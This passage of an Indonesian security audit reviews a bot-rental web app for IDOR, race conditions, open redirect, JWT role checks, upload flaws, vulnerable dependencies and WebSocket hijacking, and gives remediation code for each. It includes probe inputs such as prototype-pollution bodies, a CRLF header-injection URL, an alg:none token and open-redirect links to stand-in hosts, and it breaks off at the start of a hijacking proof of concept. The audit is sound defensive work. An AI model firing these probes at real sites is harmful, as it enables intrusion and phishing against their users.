// src/lib/realtime.ts:69-71
if (r.meta) {
  try { meta = JSON.parse(r.meta); } catch { meta = null; }
}
```

Tidak ada pemetaan objek mentah hasil deserialisasi langsung ke konstruktor kelas.

**Status: TIDAK ADA KERENTANAN.**

---

## 9. XML EXTERNAL ENTITY (XXE) — RISK: N/A

**Berkas diperiksa:** seluruh `src/`

Tidak ada parser XML sama sekali — pencarian `xml2js`, `fast-xml-parser`, `libxmljs`, `xmldom`, `DOMParser`, `.parseFromString`, `sax` menghasilkan **nol hasil**. Satu-satunya komunikasi eksternal (QRIS, catbox, AI) memakai `FormData` + `JSON.parse`, bukan XML.

**Status: TIDAK BERLAKU** (tidak ada permukaan serangan).

---

## 10. INSECURE DIRECT OBJECT REFERENCES (IDOR) — RISK: MEDIUM

- **Berkas & Baris:** `src/routes/bots.ts:40-45` (aman), `src/routes/api.ts:82-273` (tidak aman), `src/routes/auth.ts:299-316`
- **Skenario Eksploitasi:** `botsRouter` sudah benar (`ownBot` memfilter `user_id`):

```ts
// src/routes/bots.ts:40-45 — BENAR
async function ownBot(userId: number, label: string): Promise<UserBotRow | undefined> {
  return db.get<UserBotRow>('SELECT * FROM user_bots WHERE user_id = ? AND label = ?', [userId, label]);
}
```

**Bukti (terverifikasi aman):**
```
# isanss mencoba lihat bot milik isans → ditolak
GET /api/bots/bot1%238064  (token isanss)  → {"error":"Bot tidak ditemukan."}   ✅
```

Namun `apiRouter` mengakses bot **berdasarkan nama saja** (`botManager.get(name)`) tanpa memverifikasi kepemilikan — ini IDOR yang sama dengan temuan #5a, dilihat dari sudut pandang referensi objek (`:name` sebagai ID yang bisa ditebak).

```ts
// src/routes/api.ts:82-86 — akses objek lewat nama tanpa cek user_id
apiRouter.get('/bot/:name', requireAuth, (req, res) => {
  const bot = getBot(req.params.name, res);   // <- tidak ada verifikasi kepemilikan
  if (!bot) return;
  res.json(bot.toStatusJSON());
});
```

**PERBAIKAN:** sama dengan #5a — terapkan `getOwnedBot()`/`assertBotOwner()` di **seluruh** endpoint `/api/bot/:name/*`. Setelah itu, tinjau juga `src/routes/api.ts:275-296` (`/api/logs`) yang membocorkan log chat **semua bot semua user** ke pengguna biasa:

```ts
// src/routes/api.ts:290-295 — pengguna biasa bisa membaca log semua bot
const rows = await db.all(
  `SELECT c.id, c.session_id, s.name AS bot, c.direction, c.message, c.timestamp
   FROM chat_logs c LEFT JOIN bot_sessions s ON s.id = c.session_id
   ORDER BY c.id DESC LIMIT ?`,
  [limit]
);
```
Perbaikan:
```ts
// Batasi log ke bot milik user, kecuali admin
const mine = await db.all<{ label: string }>(
  'SELECT label FROM user_bots WHERE user_id = ?', [Number(req.user!.sub)]
);
const labels = mine.map((r) => r.label);
if (req.user!.role !== 'admin' && labels.length === 0) return res.json([]);
// ...lalu tambahkan klausa: AND s.name IN (?) — bangun placeholder sesuai jumlah label
```

---

## 11. MASS ASSIGNMENT / OVER-POSTING — RISK: NONE (AMAN)

- **Berkas & Baris:** `src/routes/auth.ts:33-41`, `src/routes/bots.ts:86-92`, `src/utils/validation.ts`

Setiap endpoint memvalidasi body dengan **zod** yang secara default *strip* properti tak dikenal, lalu membangun INSERT secara eksplisit per kolom — bukan menyebar `req.body`.

**Bukti eksploitasi (gagal, sesuai harapan):**
```
POST /api/auth/register
  {"username":"massassign1","password":"Test1234","role":"admin","balance":999999999}
→ 201 {"user":{"role":"user","balance":0, ...}}

SELECT username, role, balance FROM users WHERE username='massassign1';
→ massassign1 | user | 0        ✅ role & balance TIDAK terpengaruh
```

```ts
// src/routes/auth.ts:93-97 — kolom eksplisit, bukan ...parsed.data
info = await db.run('INSERT INTO users (username, tag, password_hash) VALUES (?, ?, ?)',
  [username, tag, hash]);
```

**Status: TIDAK ADA KERENTANAN.** Catatan kecil: `ModuleToggleSchema` memakai `z.record(z.any())` (`src/utils/validation.ts:50`) — saat ini tidak dipakai untuk menulis ke DB (`src/routes/api.ts:267-273` hanya membalas pesan sukses), tetapi sebaiknya diganti skema ketat bila fitur modul diaktifkan kembali.

---

## 12. RACE CONDITION — RISK: HIGH

- **Berkas & Baris:** `src/routes/bots.ts:187-231`, `src/lib/qris.ts:230-259`, `src/lib/auth.ts:198-211`

Transaksi sudah dipakai dengan benar (`db.transaction`), dan ini mencegah *partial update*. **Tetapi** tidak ada **penguncian baris** (`SELECT ... FOR UPDATE`) maupun pengecekan atomik. Isolasi default MySQL adalah `REPEATABLE READ`, dan pola baca-lalu-tulis berikut rentan terhadap *lost update*:

- **Skenario Eksploitasi (sewa bot):** Dua request `POST /api/bots/:label/rent` dikirim **bersamaan**. Keduanya membaca `balance = 130500` di awal transaksi (baris 188-190), keduanya lolos cek `balance < price`, keduanya menghitung `after = 127500`, lalu keduanya menulis `balance = 127500`. Hasil: **dua masa sewa aktif, tapi saldo hanya terpotong sekali** — kerugian finansial langsung. Karena `expires_at` juga dibaca dari `row` yang di-*cache* di luar transaksi (baris 205), kedua request juga menghitung perpanjangan dari basis yang sama (waktu sewa bertambah kurang dari seharusnya).

- **Skenario Eksploitasi (deposit):** `checkDeposit()` (`src/lib/qris.ts:210-211`) melakukan `SELECT` untuk membaca status, lalu memanggil `creditDeposit()`. Dua request `GET /api/account/deposit/:kode` yang datang bersamaan (mis. polling 4 detik dari dua tab) dapat keduanya lolos pengecekan `dep.status !== 'success'` sebelum salah satu sempat menulis, sehingga **saldo bertambah dua kali** untuk satu pembayaran.

- **Vulnerable Code:**
```ts
// src/routes/bots.ts:187-213 — baca saldo TANPA FOR UPDATE
const result = await db.transaction(async (tx) => {
  const user = await tx.get<{ balance: number }>('SELECT balance FROM users WHERE id = ?', [
    userId,
  ]);                                        // <- tidak mengunci baris
  if (!user) throw Object.assign(new Error('Akun tidak ditemukan.'), { code: 'NO_USER' });
  const balance = Number(user.balance);
  if (balance < price) { throw /* INSUFFICIENT */ }
  const after = balance - price;             // <- dua transaksi bisa sama-sama dapat nilai ini

  const now = Date.now();
  const expiry = row.expires_at == null ? null : Number(row.expires_at);  // dari luar transaksi!
  const base = expiry != null && expiry > now ? expiry : now;
  const newExpiry = base + days * 24 * 60 * 60 * 1000;

  await tx.run('UPDATE users SET balance = ? WHERE id = ?', [after, userId]);  // <- menimpa nilai
```
```ts
// src/lib/qris.ts:210-211 — cek-lalu-tulis tanpa atomisitas
if (newStatus === 'success' && dep.status !== 'success') {   // <- dibaca panjang sebelum ini
  credited = await creditDeposit(dep.id);
}
```
```ts
// src/lib/qris.ts:230-232 — di dalam transaksi, TANPA FOR UPDATE
const dep = await tx.get<DepositRow>('SELECT * FROM deposits WHERE id = ?', [depositId]);
if (!dep || dep.status === 'success') return null;    // <- penjaga, tapi tidak atomik
```

**PERBAIKAN (siap produksi):**

```ts
// src/routes/bots.ts — kunci baris + hitung potongan secara atomik dalam SQL
const result = await db.transaction(async (tx) => {
  // FOR UPDATE mengunci baris user sampai transaksi selesai → request
  // bersamaan akan MENGANTRE, bukan saling menimpa.
  const user = await tx.get<{ balance: number }>(
    'SELECT balance FROM users WHERE id = ? FOR UPDATE',
    [userId]
  );
  if (!user) throw Object.assign(new Error('Akun tidak ditemukan.'), { code: 'NO_USER' });

  const balance = Number(user.balance);
  if (balance < price) {
    throw Object.assign(new Error('Saldo kurang.'), {
      code: 'INSUFFICIENT', needed: price, balance, short: price - balance,
    });
  }

  // Kunci juga baris bot → expires_at dibaca di dalam transaksi, konsisten.
  const locked = await tx.get<{ expires_at: number | null }>(
    'SELECT expires_at FROM user_bots WHERE id = ? FOR UPDATE',
    [row.id]
  );
  if (!locked) throw new Error('Bot tidak ditemukan.');

  const balanceAfter = balance - price;

  // Potong saldo dengan ekspresi SQL (atomik) — bukan nilai yang dihitung di JS.
  await tx.run('UPDATE users SET balance = balance - ? WHERE id = ? AND balance >= ?',
    [price, userId, price]);

  const now = Date.now();
  const expiry = locked.expires_at == null ? null : Number(locked.expires_at);
  const base = expiry != null && expiry > now ? expiry : now;
  const newExpiry = base + days * 24 * 60 * 60 * 1000;

  await tx.run('UPDATE user_bots SET expires_at = ?, active = 1 WHERE id = ?',
    [newExpiry, row.id]);
  // ...INSERT orders & balance_transactions seperti sebelumnya
  return { newExpiry, after: balanceAfter, orderId: order.insertId };
});
```

```ts
// src/lib/qris.ts — kunci baris deposit + klaim status secara atomik
export async function creditDeposit(depositId: number): Promise<number> {
  const result = await db.transaction(async (tx) => {
    // FOR UPDATE: hanya SATU transaksi yang boleh memproses deposit ini.
    const dep = await tx.get<DepositRow>(
      'SELECT * FROM deposits WHERE id = ? FOR UPDATE',
      [depositId]
    );
    if (!dep || dep.status === 'success') return null;

    // Klaim status secara atomik — kalau 0 baris terpengaruh, berarti
    // transaksi lain sudah mengklaim lebih dulu → batalkan.
    const claim = await tx.run(
      `UPDATE deposits SET status = 'success', paid_at = CURRENT_TIMESTAMP,
         updated_at = CURRENT_TIMESTAMP
       WHERE id = ? AND status <> 'success'`,
      [depositId]
    );
    if (claim.affectedRows === 0) return null;

    const nominal = Number(dep.amount);
    await tx.run('UPDATE users SET balance = balance + ? WHERE id = ?', [nominal, dep.user_id]);
    const user = await tx.get<{ balance: number }>(
      'SELECT balance FROM users WHERE id = ?', [dep.user_id]
    );
    // ...INSERT balance_transactions memakai user?.balance
    return { nominal, userId: dep.user_id, owner };
  });
  // ...pushFeed setelah commit (sudah benar)
}
```
Terapkan pola yang sama (`FOR UPDATE` + `UPDATE ... WHERE kondisi_klaim`) pada `cancelDeposit()` (`src/lib/qris.ts:278-294`).

---

## 13. PROTOTYPE POLLUTION — RISK: NONE (AMAN)

- **Berkas & Baris:** `src/server.ts:41`, seluruh route

Tidak ada fungsi *deep merge* rekursif buatan sendiri (sumber utama prototype pollution). `Object.assign`/spread hanya dipakai pada objek literal yang aman (`src/server.ts:30`, `src/routes/bots.ts:55`). `express.json()` memakai `JSON.parse` yang **tidak** menyentuh `__proto__` sebagai akses properti.

**Bukti eksploitasi (gagal, sesuai harapan):**
```
POST /api/bots {"baseName":"prototest","host":"example.com",
                "__proto__":{"polluted":"yes"},
                "constructor":{"prototype":{"polluted2":"yes"}}}
→ 201 (bot dibuat normal)

GET /api/stats  → 200 (server hidup, tidak ada polusi)
```

**Status: TIDAK ADA KERENTANAN.** Catatan: `qs` versi lama pada rantai `express` punya advisory prototype-pollution (lihat #23) — tercakup di sana.

---

## 14. SERVER-SIDE TEMPLATE INJECTION (SSTI) — RISK: N/A

**Berkas diperiksa:** seluruh `src/`

Tidak ada template engine (`ejs`, `pug`, `handlebars`, `mustache`, `nunjucks`) dan tidak ada `res.render()`. Pencarian hanya menemukan `NodeJS.Timeout` (kata "timer" mengandung "ejs" sebagai substring — bukan template engine). Backend murni JSON API; frontend memakai JSX yang dikompilasi, bukan template runtime.

**Status: TIDAK BERLAKU.**

---

## 15. DYNAMIC CODE EXECUTION — RISK: NONE (AMAN)

- **Berkas & Baris:** seluruh `src/`

Pencarian `eval(`, `new Function(`, `vm.`, `child_process`, `execSync`, `spawnSync` → **nol hasil**.

**Status: TIDAK ADA KERENTANAN.**

---

## 16. HTTP CACHE POISONING — RISK: N/A (dengan catatan)

- **Berkas & Baris:** `src/server.ts`, `web/next.config.mjs`

API tidak mengirim header cache apa pun (pencarian `cache-control`, `surrogate`, `x-cache`, `vary` di `src/` → nol). Tanpa caching, tidak ada cache untuk diracuni.

**Catatan penting:** halaman frontend **dilayani Cloudflare dengan cache** — terlihat dari respons:
```
x-nextjs-cache: HIT
x-nextjs-prerender: 1
cache-control: s-maxage=31536000
```
`Vary` sudah mencakup `rsc`, `next-router-state-tree`, `Accept-Encoding` sehingga risiko rendah. Namun `s-maxage=31536000` (1 tahun) pada HTML sangat agresif — pastikan tidak ada halaman yang menampilkan data per-pengguna tanpa `no-store`. Halaman dashboard adalah komponen klien (data diambil via API setelah render), jadi aman. **Rekomendasi:**

```js
// web/next.config.mjs — tambahkan headers() untuk route dashboard
{
  source: '/dashboard/:path*',
  headers: [{ key: 'Cache-Control', value: 'private, no-store, max-age=0' }],
},
{
  source: '/login',
  headers: [{ key: 'Cache-Control', value: 'private, no-store, max-age=0' }],
}
```

**Status temuan: N/A (rendah)** — patch bersifat pengerasan.

---

## 17. UNVALIDATED REDIRECTS (OPEN REDIRECT) — RISK: MEDIUM

- **Berkas & Baris:** `web/app/login/page.tsx:14`, `25`, `42`
- **Skenario Eksploitasi:** Parameter `?next=` dipakai **langsung** tanpa validasi sebagai tujuan `router.replace()`.

```
https://skadesmart.web.id/login?next=https://situs-penipu.example
```
Setelah korban login dengan sukses, browser langsung diarahkan ke domain penyerang. Karena korban baru saja memasukkan kredensial di situs asli, halaman penyerang bisa menampilkan "sesi kedaluwarsa, login ulang" untuk **mencuri kredensial kedua kalinya**. Ini teknik *phishing* yang sangat meyakinkan. Varian `next=//evil.com` (protocol-relative) juga berbahaya. Nilainya juga tersimpan di `sessionStorage`/riwayat sehingga bisa dijadikan tautan yang tampak resmi.

- **Vulnerable Code:**
```tsx
// web/app/login/page.tsx:14
const next = params.get('next') ?? '/dashboard';

// web/app/login/page.tsx:25
useEffect(() => {
  if (!loading && user) router.replace(next);   // <- tujuan tak tervalidasi
}, [loading, user, router, next]);

// web/app/login/page.tsx:42
router.replace(next);
```

**PERBAIKAN (siap produksi):**

```ts
// web/lib/safe-next.ts — FILE BARU
/**
 * Normalisasi parameter `?next=` menjadi path internal yang aman.
 * Menolak: URL absolut, protocol-relative (//evil.com), backslash trick,
 * dan skema berbahaya (javascript:, data:).
 * Selalu mengembalikan path yang diawali '/' dan bukan '//'.
 */
export function safeNext(raw: string | null | undefined, fallback = '/dashboard'): string {
  if (!raw) return fallback;

  let v = raw.trim();

  // buang karakter kontrol & whitespace yang bisa menyamarkan skema
  v = v.replace(/[\u0000-\u001F\u007F\s]/g, '');
  if (!v) return fallback;

  // harus path relatif yang diawali tepat satu '/'
  if (!v.startsWith('/')) return fallback;
  if (v.startsWith('//')) return fallback;      // protocol-relative
  if (v.startsWith('/\\') || v.startsWith('/%2f') || v.startsWith('/%5c')) return fallback;

  // tolak kalau ada skema di posisi mana pun (mis. "/x?u=javascript:...")
  if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(v)) return fallback;

  // tolak backslash yang dinormalisasi browser menjadi '/'
  if (v.includes('\\')) return fallback;

  // hanya izinkan halaman internal yang dikenal
  const allowed = /^\/(dashboard|login)(\/[A-Za-z0-9_\-%#]*)?$/;
  return allowed.test(v) ? v : fallback;
}
```

```tsx
// web/app/login/page.tsx — pakai safeNext
import { safeNext } from '../../lib/safe-next';

// ganti baris 14:
const next = safeNext(params.get('next'));
```

---

## 18. HTTP REQUEST SMUGGLING — RISK: NONE (AMAN)

- **Berkas & Baris:** `src/server.ts:41`, infrastruktur

Tidak ada *reverse proxy* buatan sendiri yang menyalin header mentah, dan Node.js HTTP parser (llhttp) sudah menolak request dengan `Content-Length` + `Transfer-Encoding` yang bertentangan. Cloudflare juga menormalkan header di tepi jaringan.

**Bukti:**
```
POST /api/auth/login dengan "Transfer-Encoding: chunked"
→ 401 (diproses normal, tidak ada kebingungan framing)
```

**Status: TIDAK ADA KERENTANAN** pada lapisan aplikasi. Risiko utama request smuggling ada di konfigurasi Cloudflare/Nginx (di luar lingkup kode ini) — pastikan tidak ada konfigurasi proxy yang melakukan `proxy_pass` dengan normalisasi header yang lemah.

---

## 19. CR-LF / HEADER INJECTION — RISK: NONE (AMAN)

- **Berkas & Baris:** `src/server.ts`, seluruh route

Tidak ada input pengguna yang ditulis ke header respons (pencarian `res.set`/`res.header` dengan variabel → tidak ditemukan). Express/Node menolak karakter `\r\n` di nilai header.

**Bukti:**
```
GET /api/bot/abc%0d%0aX-Injected:%20yes
→ HTTP/1.1 404 Not Found     (header X-Injected TIDAK muncul)  ✅
```

**Status: TIDAK ADA KERENTANAN.**

---

## 20. GRAPHQL VULNERABILITIES — RISK: N/A

**Berkas diperiksa:** `package.json`, seluruh `src/`

Tidak ada `graphql`, `apollo-server`, `graphql-yoga`, maupun endpoint `/graphql`. API murni REST.

**Status: TIDAK BERLAKU.**

---

## 21. JWT IMPLEMENTATION FLAWS — RISK: LOW (implementasi kuat, 1 catatan)

- **Berkas & Baris:** `src/lib/auth.ts:8-12`, `80-99`

Implementasi ini **di atas rata-rata**:
- `alg` dipatok eksplisit `HS256` (`src/lib/auth.ts:82`) → **algorithm confusion aman**
- Library `jose` memverifikasi `iss` + `aud` (`src/lib/auth.ts:92`) → token dari konteks lain ditolak
- Startup **menolak jalan** kalau secret < 32 karakter (`src/lib/auth.ts:9-11`) → tidak ada secret lemah
- Access token hanya 15 menit (`src/lib/auth.ts:14`) + rotasi refresh token anti-replay (`src/lib/auth.ts:124-125`)

**Bukti:**
```
Header token asli → {"alg":"HS256"}                      ✅
Alg:none (signature kosong) → {"error":"Token tidak valid atau kedaluwarsa."}  ✅ DITOLAK
```

**Catatan (LOW):** klaim `role` dipercaya apa adanya dari token. Kalau seorang admin diturunkan menjadi user biasa, token lamanya tetap membawa `role: "admin"` sampai kedaluwarsa (maks 15 menit). `requireAdmin` (`src/lib/auth.ts:188-194`) hanya memeriksa klaim token, bukan database.

```ts
// src/lib/auth.ts:188-194
export function requireAdmin(req: Request, res: Response, next: NextFunction): void {
  if (req.user?.role !== 'admin') {       // <- dari token, bukan dari DB
    res.status(403).json({ error: 'Butuh akses admin.' });
    return;
  }
  next();
}
```

**PERBAIKAN:**
```ts
// src/lib/auth.ts — verifikasi role ke database untuk operasi admin
export async function requireAdmin(
  req: Request, res: Response, next: NextFunction
): Promise<void> {
  const sub = req.user?.sub;
  if (!sub) { res.status(401).json({ error: 'Butuh login.' }); return; }

  const u = await db.get<{ role: string; is_banned: number }>(
    'SELECT role, is_banned FROM users WHERE id = ?', [Number(sub)]
  );
  if (!u || u.is_banned || u.role !== 'admin') {
    res.status(403).json({ error: 'Butuh akses admin.' }); return;
  }
  next();
}
```
Terapkan hal sama pada `src/routes/bots.ts:83` dan `src/routes/api.ts` yang membandingkan `req.user!.role === 'admin'` langsung dari token.

---

## 22. INSECURE FILE UPLOAD — RISK: MEDIUM

- **Berkas & Baris:** `src/routes/avatar.ts:16-61`, `src/lib/catbox.ts:46-101`
- **Skenario Eksploitasi:** Implementasi dasarnya **sudah baik** — nama file diacak (`src/lib/catbox.ts:67`: `avatar_${Date.now()}_${randomBytes(4).toString('hex')}.${ext}`), magic bytes diverifikasi (`src/lib/catbox.ts:62,104-120`), MIME di-whitelist (`src/lib/catbox.ts:23-29`), hasil upload dipatok ke domain `files.catbox.moe` (`src/lib/catbox.ts:88`), dan file **tidak** ditulis ke disk server. **Namun:**

  **(a) Bypass MIME lewat urutan `Content-Type`:** `src/routes/avatar.ts:40` mengambil MIME dari header, dan `src/lib/catbox.ts:72` mengirimkannya ke catbox. File dengan magic bytes PNG tetapi header `Content-Type: image/gif` akan lolos dan diberi ekstensi `.gif`.

  **(b) Tidak ada rate limit pada endpoint upload** — terbukti:

```
15× POST /api/account/avatar  →  200 200 200 200 200 200 200 200 200 200 200 200 200 200 200
```
  Penyerang dengan satu akun sah dapat mengunggah **tak terbatas** file 2 MB ke akun catbox korban (kuota 200 MB/direktori, tapi jumlah file tak terbatas) → **penghabisan kuota** dan biaya. Inilah kenapa `src/routes/auth.ts` punya komentar "Dibatasi supaya tetap nyaman" — endpoint upload tidak mendapat perlindungan setara.

- **Vulnerable Code:**
```ts
// src/routes/avatar.ts:38-43 — tanpa rate limit
const userId = Number(req.user!.sub);
// Mime type dari header; kalau kosong tebak dari magic bytes lewat uploadAvatar.
const mime = (req.headers['content-type'] ?? '').split(';')[0].trim() || 'image/png';
try {
  const uploaded = await uploadAvatar({ buffer, mime, size: buffer.length });
```
```ts
// src/lib/catbox.ts:57-64 — MIME dari header menentukan ekstensi & tipe yang dikirim
const ext = ALLOWED_MIME[file.mime.toLowerCase()];
if (!ext) throw new Error('Format foto harus PNG, JPG, WEBP, atau GIF.');
if (!looksLikeImage(file.buffer)) throw new Error('File yang diunggah bukan gambar yang valid.');
```

**PERBAIKAN (siap produksi):**

```ts
// src/lib/catbox.ts — tentukan MIME dari MAGIC BYTES, abaikan header klien
/** Deteksi tipe gambar dari isi file; kembalikan undefined kalau bukan gambar. */
export function detectImageMime(buf: Buffer): string | undefined {
  if (buf.length < 12) return undefined;
  if (buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4e && buf[3] === 0x47) return 'image/png';
  if (buf[0] === 0xff && buf[1] === 0xd8 && buf[2] === 0xff) return 'image/jpeg';
  if (buf[0] === 0x47 && buf[1] === 0x49 && buf[2] === 0x46) return 'image/gif';
  if (buf[0] === 0x52 && buf[1] === 0x49 && buf[2] === 0x46 && buf[3] === 0x46 &&
      buf[8] === 0x57 && buf[9] === 0x45 && buf[10] === 0x42 && buf[11] === 0x50) return 'image/webp';
  return undefined;
}

export async function uploadAvatar(file: { buffer: Buffer; size: number }) {
  if (!catboxEnabled()) throw new Error('Upload foto profil belum dikonfigurasi.');
  if (file.size > MAX_AVATAR_BYTES) throw new Error(`Ukuran foto maksimal ${MAX_AVATAR_BYTES / 1024 / 1024} MB.`);

  // MIME DITENTUKAN SERVER dari isi berkas — header Content-Type klien diabaikan.
  const mime = detectImageMime(file.buffer);
  if (!mime) throw new Error('File yang diunggah bukan gambar yang valid (PNG/JPG/WEBP/GIF).');
  const ext = ALLOWED_MIME[mime];
  // ...sisanya sama, pakai `mime` hasil deteksi (bukan file.mime)
}
```

```ts
// src/lib/rateLimit.ts — FILE BARU (penghitung generik, dipakai bersama)
import { db } from '../db/index.js';

/**
 * Rate limit berbasis MySQL — bertahan melewati restart dan konsisten
 * antar-proses. `windowMs` = lebar jendela, `max` = jumlah maksimum.
 * Mengembalikan true kalau permintaan HARUS ditolak.
 */
export async function rateLimited(
  key: string, max: number, windowMs: number
): Promise<boolean> {
  const now = Date.now();
  await db.run(
    `INSERT INTO rate_limits (k, count, reset_at) VALUES (?, 1, ?)
     ON DUPLICATE KEY UPDATE
       count    = IF(reset_at < ?, 1, count + 1),
       reset_at = IF(reset_at < ?, ?, reset_at)`,
    [key, now + windowMs, now, now, now + windowMs]
  );
  const row = await db.get<{ count: number }>('SELECT count FROM rate_limits WHERE k = ?', [key]);
  return (row?.count ?? 1) > max;
}
```
Skema pendukung:
```sql
CREATE TABLE IF NOT EXISTS rate_limits (
  k        VARCHAR(191) PRIMARY KEY,
  count    INT NOT NULL DEFAULT 0,
  reset_at BIGINT NOT NULL,
  INDEX idx_rate_reset (reset_at)
) ENGINE=InnoDB;
```
```ts
// src/routes/avatar.ts — terapkan sebelum memproses file
import { rateLimited } from '../lib/rateLimit.js';

avatarRouter.post('/avatar', requireAuth, express.raw({...}), async (req, res) => {
  const userId = Number(req.user!.sub);
  // 10 unggahan / jam per akun — cukup untuk pemakaian wajar
  if (await rateLimited(`avatar:${userId}`, 10, 60 * 60_000)) {
    res.status(429).json({ error: 'Terlalu banyak mengunggah foto. Coba lagi nanti.' });
    return;
  }
  // ...lanjut
});
```
Terapkan juga pada `POST /api/account/deposit` (mis. 10/jam) dan `POST /api/bots` (mis. 20/jam).

---

## 23. DEPENDENCY CONFUSION / SUPPLY CHAIN — RISK: CRITICAL ⚠️

- **Berkas & Baris:** `package-lock.json`, `web/package-lock.json`, `package.json`
- **Skenario Eksploitasi:** `npm audit` melaporkan **9 kerentanan (1 critical, 2 high, 4 moderate)** yang seluruhnya berasal dari dependensi transitif. Yang paling berbahaya:

  **(a) `tar <= 7.5.20` — CRITICAL:** *Arbitrary File Creation/Overwrite via Hardlink Path Traversal* (GHSA-34x7-hfp2-rc4v), *Symlink Path Traversal* (GHSA-9ppj-qmqm-q256), dan *DoS akibat tidak adanya validasi jumlah folder* (GHSA-f5x3-32g6-xq36). `tar` dipakai saat memasang/ekstraksi paket native (`cmake-js`, rantai `bedrock-protocol`) → **penulisan file arbitrer di luar direktori tujuan**, berpotensi menjadi eksekusi kode.

  **(b) `axios <= 0.32.0` — HIGH:** Rangkaian panjang advisory termasuk **SSRF via Absolute URL** (GHSA-jr5f-v2jv-69x6), **NO_PROXY bypass → SSRF** (GHSA-3p68-rc4w-qgx5, GHSA-pmwg-cvhr-8vh7, GHSA-m7pr-hjqh-92cm), **Header Injection via Prototype Pollution** (GHSA-6chq-wfr3-2hj9), **Credential Leak via redirect** (GHSA-p92q-9vqr-4j8v), dan **Cloud Metadata Exfiltration** (GHSA-fvcv-3m26-pcqx). `axios` adalah dependensi transitif `prismarine-auth`/`bedrock-protocol`.

  **(c) `qs 2.2.5-6.15.3` — MODERATE:** *array-limit bypass via bracket-key comma parsing* + *DoS via Attacker Controlled isBuffer* (GHSA-4mjr-xmp4-gh2g). `qs` dipakai `express` untuk mem-parsing query string → **denial of service** lewat query yang dirancang khusus.

  **(d) `@azure/msal-node` / `prismarine-auth` / `bedrock-protocol` — MODERATE:** rantai auth Microsoft.

- **Bukti:**
```
$ npm audit --omit=dev
9 vulnerabilities (6 moderate, 2 high, 1 critical)

critical  transitif  tar
high      transitif  axios
high      transitif  cmake-js
moderate  transitif  @azure/msal-node
moderate  langsung   bedrock-protocol
moderate  langsung   express
moderate  transitif  prismarine-auth
moderate  transitif  qs
moderate  transitif  uuid
```
Positif: `package-lock.json` **ada** untuk kedua paket, dan registry seragam `registry.npmjs.org` (tidak ada risiko dependency confusion). `.gitignore` sudah mencakup `node_modules/`, `dist/`, `.env`, `data/*.db*` — tidak ada `.env` atau DB yang ter-*commit*.

**PERBAIKAN (siap produksi):**

```bash
# 1. Perbaiki yang bisa tanpa breaking change (qs, uuid)
cd /home/ikhsan/Documents/afk-bedrock && npm audit fix
cd web && npm audit fix && cd ..

# 2. Verifikasi ulang
npm audit --omit=dev

# 3. Untuk tar/axios/msal (breaking change) — perbarui dengan hati-hati.
#    bedrock-protocol dipin 3.57.0 karena alasan kompatibilitas protokol,
#    jadi JANGAN pakai --force tanpa menguji ulang koneksi bot.
npm view bedrock-protocol versions --json | tail -20
npm view prismarine-auth version
```

```jsonc
// package.json — tambahkan pengaman rantai pasok
{
  "scripts": {
    "audit:ci": "npm audit --omit=dev --audit-level=high",
    "outdated": "npm outdated || true"
  },
  "overrides": {
    // Paksa versi aman untuk dependensi transitif yang rentan
    "tar": "^7.5.21",
    "qs": "^6.15.4",
    "uuid": "^11.1.1"
  }
}
```

```bash
# 4. Pasang pengaman registry (cegah dependency confusion)
#    .npmrc — kunci ke registry resmi & aktifkan provenance
cat > /home/ikhsan/Documents/afk-bedrock/.npmrc <<'EOF'
registry=https://registry.npmjs.org/
audit=true
fund=false
# Tolak paket tanpa integritas hash
strict-ssl=true
EOF
```

```bash
# 5. Jalankan berkala (tambahkan ke cron)
cd /home/ikhsan/Documents/afk-bedrock && npm run audit:ci
```

**Catatan penting:** setelah memperbarui `tar`/`axios`, **wajib uji ulang** koneksi bot ke `be.prownetwork.net:19132` karena versi `bedrock-protocol` dipin ketat (3.57.0) dan `minecraft-data` (3.111.0) untuk alasan kompatibilitas protokol Bedrock.

---

## 24. DOM-BASED VULNERABILITIES — RISK: LOW

- **Berkas & Baris:** `web/lib/api.ts:9-22`, `web/components/realtime.tsx`, `web/components/avatar.tsx`
- **Skenario Eksploitasi:** Tidak ada `eval`, `innerHTML`, `document.write`, atau `dangerouslySetInnerHTML` di seluruh frontend (sudah diverifikasi — nol hasil). Risiko tersisa: **token disimpan di `sessionStorage`**.

```ts
// web/lib/api.ts:9-14
export function setAccessToken(t: string | null) {
  accessToken = t;
  if (typeof window === 'undefined') return;
  if (t) sessionStorage.setItem('afk_token', t);   // <- dapat dibaca JS apa pun di origin ini
  else sessionStorage.removeItem('afk_token');
}
```
Skenario: bila suatu saat muncul celah XSS (mis. #3 dieksploitasi), penyerang membaca `sessionStorage.getItem('afk_token')` **dan** token itu dikirim ke server mereka. `sessionStorage` (bukan `localStorage`) sudah tepat karena membatasi masa hidup ke satu tab — namun tetap dapat dibaca JS.

Risiko tambahan rendah: **DOM Clobbering** — `web/components/logo.tsx` dan `web/components/icons.tsx` memakai JSX (aman). `web/app/layout.tsx` tidak menyuntikkan HTML mentah.

**PERBAIKAN (opsional, jangka panjang):** pindahkan access token ke **cookie `httpOnly` + `SameSite=Strict`** yang di-set server, sehingga JS tidak pernah menyentuhnya. Ini menghilangkan dampak XSS terhadap pencurian token secara total.

```ts
// src/routes/auth.ts — set juga cookie access token (httpOnly)
function setAccessCookie(res: import('express').Response, token: string) {
  res.cookie('afk_access', token, {
    httpOnly: true,          // <- JS tidak bisa membaca
    secure: true,
    sameSite: 'strict',      // lebih ketat dari 'lax'
    maxAge: 15 * 60 * 1000,
    path: '/',
  });
}
```
```ts
// src/lib/auth.ts — extractBearer juga membaca cookie
function extractBearer(req: Request): string | null {
  const h = req.headers.authorization;
  if (h?.startsWith('Bearer ')) return h.slice(7).trim() || null;
  const c = (req as Request & { cookies?: Record<string, string> }).cookies?.afk_access;
  return c ?? null;
}
```
(Frontend lalu tidak perlu lagi menyimpan token di `sessionStorage`.)

---

## 25. CROSS-SITE WEBSOCKET HIJACKING (CSWSH) — RISK: MEDIUM ⚠️

- **Berkas & Baris:** `src/lib/realtime.ts:226-243`
- **Skenario Eksploitasi:** `WebSocketServer` dibuat **tanpa** opsi `verifyClient` dan **tanpa** pemeriksaan header `Origin`. WebSocket **tidak** dilindungi *Same-Origin Policy* — browser mengizinkan halaman mana pun membuka koneksi WS ke `wss://api.skadesmart.web.id/ws`. Meskipun pesan chat memerlukan token JWT yang valid, **snapshot awal tidak**: pada `connection`, server langsung mengirim `init` berisi 50 pesan chat terakhir dan 30 item feed aktivitas **tanpa memerlukan token sama sekali** (token bersifat opsional). Penyerang cukup membuat halaman berisi:

```html
<script>
